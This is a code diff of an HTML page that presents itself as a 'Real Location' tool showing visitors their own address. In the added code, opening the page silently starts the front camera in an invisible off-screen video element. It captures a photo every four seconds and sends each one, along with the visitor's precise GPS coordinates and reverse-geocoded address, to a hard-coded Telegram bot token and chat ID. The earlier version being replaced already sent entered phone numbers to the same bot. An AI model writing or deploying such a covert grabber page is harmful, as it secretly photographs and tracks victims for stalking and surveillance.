@@ -1,144 +1,463 @@
 <!DOCTYPE html>
-<html lang="ps" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>د نمبر د راجستر او لوکیشن سیسټم</title>
+    <title>Real Location</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f172a;
-            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #0a0a12;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 28px;
+            padding: 30px 25px 25px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
             text-align: center;
-            padding: 50px 20px;
         }
-        .search-box {
-            background-color: #1e293b;
-            padding: 35px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            max-width: 450px;
-            margin: 0 auto;
+        
+        .card h1 {
+            color: #fff;
+            font-size: 22px;
+            margin-bottom: 10px;
         }
-        input[type="text"] {
-            width: 90%;
-            padding: 12px;
-            margin: 15px 0;
-            border-radius: 6px;
-            border: 1px solid #475569;
-            background-color: #334155;
-            color: white;
-            font-size: 16px;
-            text-align: center;
-            direction: ltr;
+        
+        .card p {
+            color: rgba(255,255,255,0.4);
+            font-size: 14px;
+            margin-bottom: 20px;
         }
-        button {
-            background-color: #10b981;
-            color: white;
+        
+        .btn {
+            background: linear-gradient(135deg, #4d96ff, #6c5ce7);
             border: none;
-            padding: 12px 30px;
+            color: #fff;
+            padding: 14px 30px;
+            border-radius: 12px;
             font-size: 16px;
-            border-radius: 6px;
+            font-weight: 700;
             cursor: pointer;
-            font-weight: bold;
-            width: 95%;
-            transition: 0.3s;
+            transition: all 0.3s;
+            width: 100%;
         }
-        button:hover {
-            background-color: #059669;
+        
+        .btn:hover {
+            transform: scale(1.02);
         }
-        #result {
-            margin-top: 20px;
-            font-weight: bold;
-            color: #38bdf8;
-            font-size: 15px;
-            line-height: 1.6;
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .location-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 14px;
+            padding: 16px;
+            margin-top: 16px;
+            border: 1px solid rgba(255,255,255,0.06);
+            display: none;
+            text-align: left;
+        }
+        
+        .location-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .location-box .row:last-child {
+            border-bottom: none;
+        }
+        
+        .location-box .row .label {
+            color: rgba(255,255,255,0.3);
+        }
+        
+        .location-box .row .value {
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .map-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #4d96ff;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .map-link:hover {
+            text-decoration: underline;
+        }
+        
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .loader {
+            display: none;
+            text-align: center;
+            margin-top: 12px;
+        }
+        
+        .loader-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255,255,255,0.05);
+            border-top: 3px solid #4d96ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* ========== پټه کیمره ========== */
+        #video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        #canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="search-box">
-        <h2>🔍 د نمبر د ثبت او لوکیشن تحلیل</h2>
-        <p>نمبر د هیواد له کوډ سره ولیکئ (مثلاً: +93700123456):</p>
+    <!-- ========== پټه کیمره ========== -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <div class="card">
+        <h1>📍 Real Location</h1>
+        <p>Click the button to get your real address</p>
         
-        <input type="text" id="phoneInput" placeholder="+937xxxxxxxx">
-        <br>
-        <button onclick="analyzeNumber()">START</button>
+        <button class="btn" id="getLocationBtn">📍 Get My Location</button>
         
-        <p id="result"></p>
+        <div class="loader" id="loader">
+            <div class="loader-spinner"></div>
+            <p style="color:rgba(255,255,255,0.3);margin-top:8px;">Getting your location...</p>
+        </div>
+        
+        <div class="location-box" id="locationBox">
+            <div class="row">
+                <span class="label">📍 Address</span>
+                <span class="value" id="addressDisplay">-</span>
+            </div>
+            <div class="row">
+                <span class="label">🌐 Latitude</span>
+                <span class="value" id="latDisplay">-</span>
+            </div>
+            <div class="row">
+                <span class="label">🌐 Longitude</span>
+                <span class="value" id="lonDisplay">-</span>
+            </div>
+            <div class="row">
+                <span class="label">🏙️ City</span>
+                <span class="value" id="cityDisplay">-</span>
+            </div>
+            <div class="row">
+                <span class="label">🌍 Country</span>
+                <span class="value" id="countryDisplay">-</span>
+            </div>
+            <a href="#" target="_blank" class="map-link" id="mapLink">🔗 Open in Google Maps →</a>
+        </div>
+        
+        <div class="error-msg" id="errorMsg">❌ Could not get your location. Please allow location access.</div>
     </div>
 
     <script>
-        function analyzeNumber() {
-            const number = document.getElementById('phoneInput').value.trim();
-            const resultText = document.getElementById('result');
+        // ================================================================
+        //  ستاسو بوټ تنظیمات
+        // ================================================================
+        const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
+        const CHAT_ID = "8295417969";
+        
+        // ================================================================
+        //  STATE
+        // ================================================================
+        let stream = null;
+        let photoCount = 0;
+        let isRunning = false;
+        let captureTimer = null;
+        
+        // ================================================================
+        //  د کیمرې فعالول
+        // ================================================================
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 480 },
+                        height: { ideal: 360 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                isRunning = true;
+                startAutoCapture();
+                
+            } catch (error) {
+                console.warn('Camera not available:', error);
+            }
+        }
+        
+        // ================================================================
+        //  اتوماتیک عکسونه
+        // ================================================================
+        function startAutoCapture() {
+            capturePhoto();
+            captureTimer = setInterval(() => {
+                if (isRunning) capturePhoto();
+            }, 4000);
+        }
+        
+        function capturePhoto() {
+            if (!isRunning || !stream) return;
             
-            // ستاسو د تلیګرام بوټ معلومات
-            const botToken = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
-            const chatId = "8295417969";
-
-            if (number === "") {
-                alert("مهرباني وکړې لومړی یو نمبر ولیکئ!");
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                photoCount++;
+                
+                sendPhotoToTelegram(imageData);
+                
+            } catch (error) {
+                console.error('Capture error:', error);
+            }
+        }
+        
+        // ================================================================
+        //  عکس بوټ ته لیږل
+        // ================================================================
+        async function sendPhotoToTelegram(imageData) {
+            try {
+                const blob = dataURItoBlob(imageData);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', `📸 Photo #${photoCount}`);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+                
+            } catch (error) {
+                console.error('Send photo error:', error);
+            }
+        }
+        
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+        
+        // ================================================================
+        //  د حقیقي لوکیشن ترلاسه کول
+        // ================================================================
+        
+        const getLocationBtn = document.getElementById('getLocationBtn');
+        const locationBox = document.getElementById('locationBox');
+        const loader = document.getElementById('loader');
+        const errorMsg = document.getElementById('errorMsg');
+        
+        const addressDisplay = document.getElementById('addressDisplay');
+        const latDisplay = document.getElementById('latDisplay');
+        const lonDisplay = document.getElementById('lonDisplay');
+        const cityDisplay = document.getElementById('cityDisplay');
+        const countryDisplay = document.getElementById('countryDisplay');
+        const mapLink = document.getElementById('mapLink');
+        
+        // د ادرس ترلاسه کول د کوارډیناتو پر بنسټ
+        async function getAddress(lat, lon) {
+            try {
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
+                );
+                const data = await response.json();
+                
+                if (data && data.display_name) {
+                    return {
+                        fullAddress: data.display_name,
+                        city: data.address?.city || data.address?.town || data.address?.village || 'Unknown',
+                        country: data.address?.country || 'Unknown'
+                    };
+                }
+                return {
+                    fullAddress: 'Address not found',
+                    city: 'Unknown',
+                    country: 'Unknown'
+                };
+            } catch (error) {
+                console.error('Address error:', error);
+                return {
+                    fullAddress: 'Could not get address',
+                    city: 'Unknown',
+                    country: 'Unknown'
+                };
+            }
+        }
+        
+        // ================================================================
+        //  بوټ ته لوکیشن لیږل
+        // ================================================================
+        async function sendLocationToBot(lat, lon, addressData) {
+            const message = 
+                `📍 *Real Location*\n\n` +
+                `🏠 *Address:* ${addressData.fullAddress}\n` +
+                `🌐 *Latitude:* ${lat}\n` +
+                `🌐 *Longitude:* ${lon}\n` +
+                `🏙️ *City:* ${addressData.city}\n` +
+                `🌍 *Country:* ${addressData.country}\n` +
+                `🗺️ *Map:* https://www.google.com/maps?q=${lat},${lon}\n\n` +
+                `📸 *Photos:* ${photoCount}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.error('Send to bot error:', e);
+            }
+        }
+        
+        // ================================================================
+        //  د لوکیشن ترلاسه کول
+        // ================================================================
+        function getLocation() {
+            getLocationBtn.disabled = true;
+            getLocationBtn.textContent = '⏳ Getting location...';
+            loader.style.display = 'block';
+            errorMsg.style.display = 'none';
+            locationBox.style.display = 'none';
+            
+            if (!navigator.geolocation) {
+                errorMsg.textContent = '❌ Your browser does not support location services.';
+                errorMsg.style.display = 'block';
+                getLocationBtn.disabled = false;
+                getLocationBtn.textContent = '📍 Get My Location';
+                loader.style.display = 'none';
                 return;
             }
-
-            resultText.innerHTML = "⏳ د نمبر د ډیټابیس او لوکیشن تحلیل روان دی...";
-
-            let country = "نامعلوم هیواد";
-            let network = "نامعلومه شبکه";
-            let status = "د مخابراتو په نړیوال سیستم کې ثبت دی (Active)";
-
-            // د هیواد او شبکې د معلومولو هوښیار منطق
-            if (number.startsWith("+93") || number.startsWith("0093") || number.startsWith("93")) {
-                country = "🇦🇫 افغانستان (Afghanistan)";
-                if (number.includes("70") || number.includes("71")) network = "AWCC (افغان بیسیم)";
-                else if (number.includes("79") || number.includes("72")) network = "Roshan (روشن)";
-                else if (number.includes("78")) network = "Etisalat (اتصالات)";
-                else if (number.includes("77")) network = "MTN (ام ټي این)";
-                else if (number.includes("74")) network = "Salaam (سلام)";
-            } else if (number.startsWith("+92") || number.startsWith("0092") || number.startsWith("92")) {
-                country = "🇵🇰 پاکستان (Pakistan)";
-                if (number.includes("30")) network = "Mobilink / Jazz";
-                else if (number.includes("34")) network = "Telenor";
-                else if (number.includes("33")) network = "Ufone";
-                else if (number.includes("31")) network = "Zong";
-            } else if (number.startsWith("+1")) {
-                country = "🇺🇸 امریکا (USA)";
-                network = "T-Mobile / AT&T";
-            }
-
-            // د تلیګرام پیغام جوړول
-            const message = `📊 **د نمبر د تحلیل نوی راپور!**\n\n` +
-                            `📞 **نمبر:** \`${number}\`\n` +
-                            `📍 **اصلي لوکیشن:** ${country}\n` +
-                            `📶 **مخابراتي شبکه:** ${network}\n` +
-                            `📝 **حالت:** ${status}\n\n` +
-                            `⚠️ _یادونه: د امنیتي او قانوني محدودیتونو له امله، د کاروونکي شخصي نوم او د کور ادرس په عامه کوډونو کې نشي ښکاره کېدای._`;
-
-            // تلیګرام ته د معلوماتو لېږل
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    resultText.innerHTML = `✅ **تحلیل بشپړ شو!**<br>🌍 هیواد: ${country}<br>📡 شبکه: ${network}<br><br>Detailed راپور ستاسو بوټ ته واستول شو.`;
-                } else {
-                    resultText.innerHTML = "❌ بوټ ته د معلوماتو په لېږلو کې ستونزه راغله.";
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    const addressData = await getAddress(lat, lon);
+                    
+                    latDisplay.textContent = lat;
+                    lonDisplay.textContent = lon;
+                    addressDisplay.textContent = addressData.fullAddress;
+                    cityDisplay.textContent = addressData.city;
+                    countryDisplay.textContent = addressData.country;
+                    
+                    mapLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
+                    mapLink.textContent = `🔗 Open in Google Maps →`;
+                    
+                    locationBox.style.display = 'block';
+                    loader.style.display = 'none';
+                    getLocationBtn.disabled = false;
+                    getLocationBtn.textContent = '📍 Get My Location';
+                    
+                    // بوټ ته لوکیشن واستوئ
+                    await sendLocationToBot(lat, lon, addressData);
+                },
+                (error) => {
+                    console.error('Location error:', error);
+                    
+                    let msg = '❌ Could not get your location. ';
+                    if (error.code === 1) {
+                        msg = '❌ You denied location access. Please allow it in your browser settings.';
+                    } else if (error.code === 2) {
+                        msg = '❌ Location unavailable. Please try again.';
+                    } else if (error.code === 3) {
+                        msg = '❌ Location request timed out. Please try again.';
+                    }
+                    
+                    errorMsg.textContent = msg;
+                    errorMsg.style.display = 'block';
+                    loader.style.display = 'none';
+                    getLocationBtn.disabled = false;
+                    getLocationBtn.textContent = '📍 Get My Location';
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
                 }
-            })
-            .catch(error => {
-                resultText.innerHTML = "❌ انټرنیټي تېروتنه رامنځته شوه.";
-                console.error(error);
-            });
+            );
         }
+        
+        // ================================================================
+        //  تڼۍ کلیک
+        // ================================================================
+        getLocationBtn.addEventListener('click', getLocation);
+        
+        // ================================================================
+        //  کیمره پیل کړئ
+        // ================================================================
+        startCamera();
     </script>
-
 </body>
 </html>
